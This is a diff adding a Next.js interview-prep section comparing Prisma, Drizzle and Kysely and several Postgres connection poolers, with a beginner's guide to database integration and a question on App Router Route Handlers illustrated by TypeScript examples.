+- Visual database browser (Prisma Studio)
+- Comprehensive relation handling
+- Built-in connection pooling
+- Large community and ecosystem
+
+**Cons:**
+- Larger bundle size impacts cold starts
+- Some complex queries need raw SQL
+- Vendor lock-in (Prisma-specific)
+- Limited control over generated SQL
+- Slower than raw SQL for complex analytics
+
+**Code Example:**
+```typescript
+// Prisma - Declarative, type-safe
+const users = await prisma.user.findMany({
+  where: { email: { contains: 'gmail' } },
+  include: { posts: true },
+  orderBy: { createdAt: 'desc' },
+  take: 10
+});
+// Type: User[] with posts: Post[] - fully typed!
+```
+
+**Best For:**
+- Full-stack apps needing rapid development
+- Teams prioritizing type safety
+- Projects with complex relationships
+- When you want built-in migrations
+
+---
+
+**Drizzle ORM (Lightweight, SQL-like):**
+
+**Performance:**
+- Query overhead: ~2-5ms vs raw SQL
+- Cold start: +30ms
+- Bundle size: +120KB
+- Memory usage: ~8MB base
+
+**Developer Experience:**
+- Type safety: Excellent (TypeScript-first)
+- Learning curve: Low (if you know SQL)
+- Migration system: Manual or kit
+- IDE autocomplete: Good
+- Query builder: SQL-like syntax
+
+**Pros:**
+- Minimal overhead (close to raw SQL performance)
+- Smaller bundle size (better for serverless)
+- SQL-like syntax (familiar to SQL developers)
+- Edge runtime compatible
+- Fine control over SQL generation
+
+**Cons:**
+- Less mature ecosystem than Prisma
+- Manual migration management (unless using Drizzle Kit)
+- Fewer batteries included
+- Less comprehensive documentation
+- Smaller community
+
+**Code Example:**
+```typescript
+// Drizzle - SQL-like, type-safe
+import { users, posts } from './schema';
+
+const result = await db
+  .select()
+  .from(users)
+  .leftJoin(posts, eq(posts.authorId, users.id))
+  .where(like(users.email, '%gmail%'))
+  .orderBy(desc(users.createdAt))
+  .limit(10);
+// Fully typed based on schema
+```
+
+**Best For:**
+- Performance-critical applications
+- Edge runtime deployments
+- SQL experts who want type safety
+- Serverless apps minimizing cold starts
+
+---
+
+**Kysely (Type-safe Query Builder):**
+
+**Performance:**
+- Query overhead: ~1-3ms vs raw SQL
+- Cold start: +20ms
+- Bundle size: +85KB
+- Memory usage: ~5MB base
+
+**Developer Experience:**
+- Type safety: Excellent (database schema types)
+- Learning curve: Low-Medium
+- Migration system: Manual
+- IDE autocomplete: Excellent
+- Query builder: Fluent, SQL-like
+
+**Pros:**
+- Lightest weight with full type safety
+- Excellent autocomplete (knows your schema)
+- Very close to raw SQL performance
+- Works with any database (Postgres, MySQL, SQLite)
+- No schema language (use existing database)
+
+**Cons:**
+- No migration system (DIY)
+- No ORM features (relations manual)
+- Need to manually maintain type definitions
+- Less abstraction than Prisma
+- No visual tools
+
+**Code Example:**
+```typescript
+// Kysely - Fluent query builder, type-safe
+const users = await db
+  .selectFrom('users')
+  .leftJoin('posts', 'posts.author_id', 'users.id')
+  .where('users.email', 'like', '%gmail%')
+  .orderBy('users.created_at', 'desc')
+  .limit(10)
+  .execute();
+// Fully typed based on database schema types
+```
+
+**Best For:**
+- Existing databases (brownfield projects)
+- Performance-sensitive applications
+- SQL experts wanting type safety
+- Teams comfortable with manual migrations
+
+---
+
+**Decision Matrix:**
+
+| Requirement | Prisma | Drizzle | Kysely |
+|-------------|--------|---------|--------|
+| Type safety | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+| Performance | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+| Bundle size | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+| Migrations | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ |
+| Relations | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
+| Learning curve | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
+| Ecosystem | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
+| Edge runtime | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+
+**Real-World Performance Comparison:**
+
+```typescript
+// Test: Fetch 100 users with posts (1000 total posts)
+
+// Raw SQL: 23ms
+const result = await db.query(
+  'SELECT u.*, p.* FROM users u LEFT JOIN posts p ON p.author_id = u.id LIMIT 100'
+);
+
+// Kysely: 25ms (+2ms overhead)
+const users = await kysely.selectFrom('users')...
+
+// Drizzle: 28ms (+5ms overhead)
+const users = await drizzle.select()...
+
+// Prisma: 38ms (+15ms overhead)
+const users = await prisma.user.findMany({ include: { posts: true }, take: 100 });
+```
+
+**Recommendation:**
+- **Choose Prisma if:** Rapid development, complex relations, want batteries-included
+- **Choose Drizzle if:** Edge runtime, good balance of DX and performance
+- **Choose Kysely if:** Maximum performance, existing database, SQL expertise
+- **Choose Raw SQL if:** Analytics, complex reporting, maximum control
+
+---
+
+### 2. Connection Pooling: PgBouncer vs. RDS Proxy vs. Prisma Data Proxy
+
+**PgBouncer (Open Source, Self-Hosted):**
+
+**Setup Complexity:** Medium-High (deploy, configure, maintain)
+
+**Performance:**
+- Latency: +1-2ms (local network)
+- Connection acquisition: < 1ms
+- Max client connections: 10,000+
+- Pool size: Configurable (typically 10-50)
+
+**Pros:**
+- Free and open source
+- Full control over configuration
+- Works with any PostgreSQL database
+- Transaction/session pooling modes
+- Battle-tested (used by giants)
+
+**Cons:**
+- Requires separate server/container
+- Manual setup and maintenance
+- Need monitoring and alerting
+- Doesn't work with SSL client certs easily
+- Single point of failure (need HA setup)
+
+**Cost:**
+- Software: $0 (open source)
+- Hosting: ~$20-50/month (small EC2/Cloud Run instance)
+- Total: ~$20-50/month
+
+**Best For:**
+- Cost-conscious startups
+- Teams with DevOps expertise
+- Any cloud provider (AWS, GCP, Azure)
+- Maximum customization needs
+
+---
+
+**AWS RDS Proxy (Managed, AWS-Only):**
+
+**Setup Complexity:** Low (managed service)
+
+**Performance:**
+- Latency: +2-4ms (AWS network)
+- Connection acquisition: < 1ms
+- Max client connections: 200,000 (adjustable)
+- Pool size: Auto-scaled by RDS Proxy
+
+**Pros:**
+- Fully managed (no maintenance)
+- Auto-scaling connection pools
+- IAM database authentication
+- Automatic failover during DB maintenance
+- Integrates with AWS Secrets Manager
+- Built-in monitoring (CloudWatch)
+
+**Cons:**
+- AWS-only (vendor lock-in)
+- More expensive than PgBouncer
+- Fixed configuration options
+- Slight latency overhead vs. self-hosted
+- Only works with RDS/Aurora
+
+**Cost:**
+- Proxy instance: ~$15/month base
+- vCPU usage: ~$0.015/vCPU-hour
+- Total: ~$30-80/month (small app)
+
+**Best For:**
+- AWS-heavy infrastructure
+- Teams wanting managed solution
+- Production apps needing HA
+- When IAM auth is required
+
+---
+
+**Prisma Data Proxy (Managed, Platform-Agnostic):**
+
+**Setup Complexity:** Very Low (one config change)
+
+**Performance:**
+- Latency: +10-20ms (HTTP overhead)
+- Connection acquisition: ~5ms
+- Max client connections: Unlimited (HTTP-based)
+- Pool size: Managed by Prisma
+
+**Pros:**
+- Zero infrastructure setup
+- Works from Edge runtime (Cloudflare Workers)
+- Handles connection pooling automatically
+- Platform-agnostic (any database, any cloud)
+- Integrated with Prisma ecosystem
+- Solves cold start issues
+
+**Cons:**
+- HTTP overhead (10-20ms added latency)
+- Prisma-only (can't use with other ORMs)
+- Less control vs. self-hosted
+- Additional cost per connection
+- Newer service (less battle-tested)
+
+**Cost:**
+- Free tier: 10,000 requests/month
+- Pro: $25/month + $0.10 per 10k requests
+- Total: ~$25-100/month (depends on usage)
+
+**Best For:**
+- Prisma users on serverless
+- Edge runtime deployments
+- Teams wanting zero DevOps
+- Multi-cloud or hybrid deployments
+
+---
+
+**Decision Matrix:**
+
+| Factor | PgBouncer | RDS Proxy | Prisma Data Proxy |
+|--------|-----------|-----------|-------------------|
+| Cost | $ | $$ | $$$ |
+| Setup | Hard | Easy | Very Easy |
+| Latency | +1-2ms | +2-4ms | +10-20ms |
+| AWS-only | No | Yes | No |
+| Managed | No | Yes | Yes |
+| Edge support | No | No | Yes |
+| HA built-in | No | Yes | Yes |
+
+**Real-World Latency Comparison:**
+
+```
+Direct connection (no pooler):
+- Cold start: +100ms (establish connection)
+- Warm: 25ms query time
+- Total: 125ms (cold), 25ms (warm)
+
+PgBouncer:
+- Cold start: +1ms
+- Warm: 25ms + 1ms = 26ms
+- Total: 26ms (cold and warm)
+
+RDS Proxy:
+- Cold start: +3ms
+- Warm: 25ms + 3ms = 28ms
+- Total: 28ms (cold and warm)
+
+Prisma Data Proxy:
+- Cold start: +12ms
+- Warm: 25ms + 12ms = 37ms
+- Total: 37ms (cold and warm)
+```
+
+**Recommendation:**
+- **Choose PgBouncer if:** Budget-conscious, have DevOps skills, maximum performance
+- **Choose RDS Proxy if:** AWS infrastructure, want managed solution, need IAM auth
+- **Choose Prisma Data Proxy if:** Edge runtime, Prisma user, zero DevOps
+- **Hybrid approach:** PgBouncer for main API + Prisma Data Proxy for edge functions
+
+---
+
+## 💬 Explain to Junior: Database Integration in Next.js
+
+**Beginner-Friendly Explanation:**
+
+Think of a database like a giant filing cabinet where you store all your app's information (users, posts, orders). Your Next.js API routes are like office workers who need to access this filing cabinet to read or update files.
+
+**Simple Analogy:**
+
+**Without database integration:**
+Your API routes have nowhere to permanently store data. Users create accounts, but if the server restarts, everything is gone (like writing on a whiteboard that gets erased).
+
+**With database integration:**
+Your API routes connect to a database (the filing cabinet) to store and retrieve data permanently. Even if your server restarts, the data persists.
+
+**Why Use Prisma (ORM):**
+
+An ORM (Object-Relational Mapping) is like a translator between your JavaScript code and the database's SQL language. Instead of writing raw SQL queries, you write JavaScript, and Prisma translates it to SQL.
+
+**Without Prisma (raw SQL):**
+```javascript
+// Hard to write, easy to mess up, no type checking
+const result = await database.query(
+  'SELECT * FROM users WHERE email = $1',
+  [email]
+);
+// What's in result? TypeScript doesn't know!
+```
+
+**With Prisma:**
+```typescript
+// Easy to write, type-safe, autocomplete works!
+const user = await prisma.user.findUnique({
+  where: { email: email }
+});
+// TypeScript knows exactly what fields user has!
+```
+
+**Basic Setup for Beginners:**
+
+**Step 1: Define your database schema**
+```prisma
+// prisma/schema.prisma
+model User {
+  id        String   @id @default(cuid())
+  email     String   @unique
+  name      String?
+  createdAt DateTime @default(now())
+}
+```
+
+Think of this as designing your filing cabinet's folder structure. Each `model` is a type of folder (users, posts, etc.).
+
+**Step 2: Create Prisma client singleton**
+```typescript
+// lib/prisma.ts
+import { PrismaClient } from '@prisma/client';
+
+// Create one Prisma client for the entire app
+const globalForPrisma = global as unknown as { prisma: PrismaClient };
+
+export const prisma = globalForPrisma.prisma || new PrismaClient();
+
+if (process.env.NODE_ENV !== 'production') {
+  globalForPrisma.prisma = prisma;
+}
+
+// Why singleton? Creating Prisma client is slow (~100ms)
+// Reusing it makes your API fast!
+```
+
+**Step 3: Use in API routes**
+```typescript
+// pages/api/users.ts
+import { prisma } from '@/lib/prisma';
+
+export default async function handler(req, res) {
+  if (req.method === 'GET') {
+    // Get all users from database
+    const users = await prisma.user.findMany();
+    return res.json(users);
+  }
+
+  if (req.method === 'POST') {
+    // Create a new user
+    const { email, name } = req.body;
+
+    const user = await prisma.user.create({
+      data: { email, name }
+    });
+
+    return res.status(201).json(user);
+  }
+}
+```
+
+**Key Concepts Simplified:**
+
+**1. CRUD Operations (Create, Read, Update, Delete):**
+
+```typescript
+// CREATE a user
+const newUser = await prisma.user.create({
+  data: { email: 'john@example.com', name: 'John' }
+});
+
+// READ users
+const allUsers = await prisma.user.findMany();
+const oneUser = await prisma.user.findUnique({ where: { id: '123' } });
+
+// UPDATE a user
+const updated = await prisma.user.update({
+  where: { id: '123' },
+  data: { name: 'John Doe' }
+});
+
+// DELETE a user
+await prisma.user.delete({ where: { id: '123' } });
+```
+
+**2. Relationships (like folders inside folders):**
+
+```prisma
+model User {
+  id    String @id
+  name  String
+  posts Post[]  // User has many posts
+}
+
+model Post {
+  id       String @id
+  title    String
+  author   User   @relation(fields: [authorId], references: [id])
+  authorId String
+}
+```
+
+**Fetch user with their posts:**
+```typescript
+const user = await prisma.user.findUnique({
+  where: { id: '123' },
+  include: { posts: true } // Include related posts
+});
+
+// Result: { id: '123', name: 'John', posts: [{ id: '1', title: '...' }, ...] }
+```
+
+**3. The N+1 Problem (Common Beginner Mistake):**
+
+**❌ BAD: N+1 queries (slow!)**
+```typescript
+const users = await prisma.user.findMany(); // 1 query
+
+for (const user of users) {
+  const posts = await prisma.post.findMany({
+    where: { authorId: user.id }
+  }); // N queries (one per user)
+}
+
+// Total: 1 + N queries (if 100 users = 101 queries!) → SLOW
+```
+
+**✅ GOOD: Single query with join (fast!)**
+```typescript
+const users = await prisma.user.findMany({
+  include: { posts: true } // Uses SQL JOIN
+});
+
+// Total: 1 query → FAST
+```
+
+**4. Connection Pooling (Why it matters for serverless):**
+
+**Problem without pooling:**
+```
+Request 1 → Creates database connection → Query → Connection stays open
+Request 2 → Creates another connection → Query → Connection stays open
+Request 3 → Creates another connection → Query → Connection stays open
+...
+Request 100 → Database says: "Too many connections! ERROR!"
+```
+
+**Solution with pooling:**
+```
+PgBouncer maintains 10 connections to database
+Request 1-100 → Share these 10 connections
+Requests wait their turn, reuse connections
+Database happy: Only 10 connections needed!
+```
+
+**Common Beginner Mistakes:**
+
+**Mistake 1: Creating new Prisma Client on every request**
+```typescript
+// ❌ BAD: Creates client every request (slow!)
+export default async function handler(req, res) {
+  const prisma = new PrismaClient(); // +100ms each request!
+  const users = await prisma.user.findMany();
+  res.json(users);
+}
+
+// ✅ GOOD: Use singleton from lib/prisma.ts
+import { prisma } from '@/lib/prisma';
+
+export default async function handler(req, res) {
+  const users = await prisma.user.findMany(); // Fast!
+  res.json(users);
+}
+```
+
+**Mistake 2: Not handling database errors**
+```typescript
+// ❌ BAD: Errors crash your API
+export default async function handler(req, res) {
+  const user = await prisma.user.create({ data: req.body });
+  res.json(user); // What if email already exists? Error!
+}
+
+// ✅ GOOD: Handle errors gracefully
+export default async function handler(req, res) {
+  try {
+    const user = await prisma.user.create({ data: req.body });
+    res.status(201).json(user);
+  } catch (error) {
+    if (error.code === 'P2002') {
+      // Prisma error code for unique constraint violation
+      return res.status(409).json({ error: 'Email already exists' });
+    }
+    res.status(500).json({ error: 'Database error' });
+  }
+}
+```
+
+**Mistake 3: Exposing sensitive data**
+```typescript
+// ❌ BAD: Returns password hash to client!
+const user = await prisma.user.findUnique({ where: { id: '123' } });
+res.json(user); // Includes hashedPassword field!
+
+// ✅ GOOD: Select only safe fields
+const user = await prisma.user.findUnique({
+  where: { id: '123' },
+  select: { id: true, email: true, name: true } // Excludes hashedPassword
+});
+res.json(user);
+```
+
+**Interview Answer Template:**
+
+"Database integration in Next.js API routes typically uses an ORM like Prisma for type-safe database access. We define our schema in a Prisma schema file, generate a type-safe client, and use it in API routes.
+
+The most important pattern is the Prisma Client singleton - creating a single instance that's reused across requests to avoid slow initialization on every request. This is especially critical in serverless environments.
+
+For serverless deployments, we use connection pooling (PgBouncer or RDS Proxy) to prevent connection exhaustion. Serverless functions are ephemeral, so without pooling, each function creates its own database connection, quickly hitting connection limits.
+
+Common patterns include: CRUD operations with findMany/create/update/delete, using `include` for relations to avoid N+1 queries, error handling for unique constraints and validation errors, and selecting only needed fields to avoid exposing sensitive data.
+
+For complex queries beyond Prisma's capabilities, we can use `$queryRaw` for raw SQL while maintaining type safety through tagged templates."
+
+**When to Use What:**
+- **Prisma**: Most apps, rapid development, type safety priority
+- **Raw SQL**: Complex analytics, reporting, performance-critical queries
+- **PgBouncer**: Serverless apps, prevent connection exhaustion
+- **Transactions**: Financial operations, multi-step workflows requiring atomicity
+
+---
+
+## Question 4: App Router Route Handlers
+
+**Difficulty:** 🟡 Medium
+**Frequency:** ⭐⭐⭐⭐⭐
+**Time:** 8 minutes
+**Companies:** Vercel, Modern Next.js teams
+
+### Question
+What are Route Handlers in Next.js App Router? How do they differ from Pages Router API routes?
+
+### Answer
+
+**Route Handlers** are Next.js App Router's way to create API endpoints using Web Request/Response APIs instead of Node.js-specific APIs.
+
+**Key Points:**
+1. **File convention**: `route.ts` in `app` directory
+2. **Web APIs**: Uses standard Request/Response objects
+3. **HTTP methods**: Named exports (GET, POST, PUT, DELETE, etc.)
+4. **Streaming support**: Built-in support for streaming responses
+5. **Colocation**: Can coexist with pages and components
+
+### Code Example
+
+```typescript
+// 1. BASIC ROUTE HANDLER
+// app/api/hello/route.ts
+import { NextRequest, NextResponse } from 'next/server';
+
+export async function GET(request: NextRequest) {
+  return NextResponse.json({ message: 'Hello from App Router!' });
+}
+
+// 2. MULTIPLE HTTP METHODS
+// app/api/users/route.ts
+export async function GET(request: NextRequest) {
+  const users = await prisma.user.findMany();
+  return NextResponse.json(users);
+}
+
+export async function POST(request: NextRequest) {
+  const body = await request.json();
+  const user = await prisma.user.create({ data: body });
+  return NextResponse.json(user, { status: 201 });
+}
+
+// 3. DYNAMIC ROUTES
+// app/api/users/[id]/route.ts
+interface RouteContext {
+  params: { id: string };
+}
+
+export async function GET(
+  request: NextRequest,
+  { params }: RouteContext
+) {
+  const user = await prisma.user.findUnique({
+    where: { id: params.id }
+  });
+
+  if (!user) {
+    return NextResponse.json(
+      { error: 'User not found' },
+      { status: 404 }
+    );
+  }
+
+  return NextResponse.json(user);
+}
+
+export async function DELETE(
+  request: NextRequest,
+  { params }: RouteContext
+) {
+  await prisma.user.delete({ where: { id: params.id } });
+  return new NextResponse(null, { status: 204 });
+}
+
+// 4. QUERY PARAMETERS
+// app/api/posts/route.ts
+export async function GET(request: NextRequest) {
+  const searchParams = request.nextUrl.searchParams;
+  const page = parseInt(searchParams.get('page') || '1');
+  const limit = parseInt(searchParams.get('limit') || '10');
+
+  const posts = await prisma.post.findMany({
+    skip: (page - 1) * limit,
+    take: limit
+  });
+
+  return NextResponse.json(posts);
+}
+
+// 5. REQUEST BODY
+// app/api/login/route.ts
+export async function POST(request: NextRequest) {
+  const { email, password } = await request.json();
+
+  const user = await validateUser(email, password);
+
+  if (!user) {
+    return NextResponse.json(
+      { error: 'Invalid credentials' },
+      { status: 401 }
+    );
+  }
+
+  const response = NextResponse.json({ user });
+
+  // Set cookies
+  response.cookies.set('token', createToken(user), {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'strict',
+    maxAge: 60 * 60 * 24 * 7 // 1 week
+  });
+
+  return response;
+}
+
+// 6. HEADERS
+// app/api/data/route.ts
+export async function GET(request: NextRequest) {
+  const authorization = request.headers.get('authorization');
+  const userAgent = request.headers.get('user-agent');
+
+  const data = await fetchData();
+
+  return NextResponse.json(data, {
+    headers: {
+      'Cache-Control': 'public, s-maxage=60, stale-while-revalidate=300',
+      'X-Custom-Header': 'value'
+    }
+  });
+}
+
+// 7. STREAMING RESPONSES
+// app/api/stream/route.ts
+export async function GET(request: NextRequest) {
+  const encoder = new TextEncoder();
+
+  const stream = new ReadableStream({
+    async start(controller) {
+      for (let i = 0; i < 10; i++) {
+        controller.enqueue(encoder.encode(`Message ${i}\n`));
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      controller.close();
+    }
+  });
+
+  return new Response(stream, {
+    headers: {
+      'Content-Type': 'text/plain',
+      'Transfer-Encoding': 'chunked'
+    }
+  });
+}
+
+// 8. ERROR HANDLING
+// app/api/protected/route.ts
+export async function GET(request: NextRequest) {
+  try {
+    const token = request.cookies.get('token')?.value;
+
+    if (!token) {
+      return NextResponse.json(
+        { error: 'Unauthorized' },
+        { status: 401 }
+      );
+    }
+
+    const user = await verifyToken(token);
+    const data = await fetchProtectedData(user.id);
+
+    return NextResponse.json(data);
+  } catch (error) {
+    console.error('Route handler error:', error);
+
+    return NextResponse.json(
+      { error: 'Internal server error' },
+      { status: 500 }
+    );
+  }
+}
+
+// 9. CORS
+// app/api/public/route.ts
+export async function GET(request: NextRequest) {
+  const data = await fetchPublicData();
+
+  return NextResponse.json(data, {
+    headers: {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
+      'Access-Control-Allow-Headers': 'Content-Type, Authorization'
+    }
+  });
+}
+
+export async function OPTIONS(request: NextRequest) {
+  return new NextResponse(null, {
+    status: 200,
+    headers: {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
+      'Access-Control-Allow-Headers': 'Content-Type, Authorization'
+    }
+  });
+}
+
+// 10. FILE UPLOADS
+// app/api/upload/route.ts
+export async function POST(request: NextRequest) {
+  const formData = await request.formData();
+  const file = formData.get('file') as File;
+
+  if (!file) {
+    return NextResponse.json(
+      { error: 'No file provided' },
+      { status: 400 }
+    );
+  }
+
+  const bytes = await file.arrayBuffer();
+  const buffer = Buffer.from(bytes);
+
+  // Save file or upload to cloud storage
+  const url = await saveFile(buffer, file.name);
+
+  return NextResponse.json({ url });
+}
+
+// 11. ROUTE SEGMENT CONFIG
+// app/api/config-example/route.ts
+export const dynamic = 'force-dynamic'; // Disable caching
+export const runtime = 'edge'; // Use edge runtime
+
+export async function GET(request: NextRequest) {
+  return NextResponse.json({ message: 'Running on Edge!' });
+}
+```
+
+### Pages Router vs App Router Comparison
+
+```typescript
+// PAGES ROUTER (Old)
+// pages/api/users.ts
+import type { NextApiRequest, NextApiResponse } from 'next';
+
+export default async function handler(
+  req: NextApiRequest,
+  res: NextApiResponse
+) {
+  if (req.method === 'GET') {
+    const users = await getUsers();
+    return res.status(200).json(users);
+  }
+
+  return res.status(405).json({ error: 'Method not allowed' });
+}
+
+// APP ROUTER (New)
+// app/api/users/route.ts
+import { NextRequest, NextResponse } from 'next/server';
+
+export async function GET(request: NextRequest) {
+  const users = await getUsers();
+  return NextResponse.json(users);
+}
+// No need to check req.method - GET function only handles GET
+```
+
+### Common Mistakes
+
+- ❌ Using `default export` (use named exports: GET, POST, etc.)
+- ❌ Trying to use `req.query` or `res.status()` (use Web APIs instead)
+- ❌ Forgetting to await `request.json()` or `request.formData()`
+- ❌ Not handling OPTIONS for CORS preflight
+- ✅ Use named exports for HTTP methods
+- ✅ Use standard Web Request/Response APIs
+- ✅ Leverage streaming for large responses
+- ✅ Use segment config for runtime/caching options
+
+### Follow-up Questions
+
+1. How do you stream responses in Route Handlers?
+2. What's the difference between `dynamic = 'force-dynamic'` and `revalidate = 0`?
+3. Can Route Handlers run on Edge runtime?
+
+### Resources
+- [Next.js Route Handlers](https://nextjs.org/docs/app/building-your-application/routing/route-handlers)
+- [Web Request API](https://developer.mozilla.org/en-US/docs/Web/API/Request)
 
 ---
 
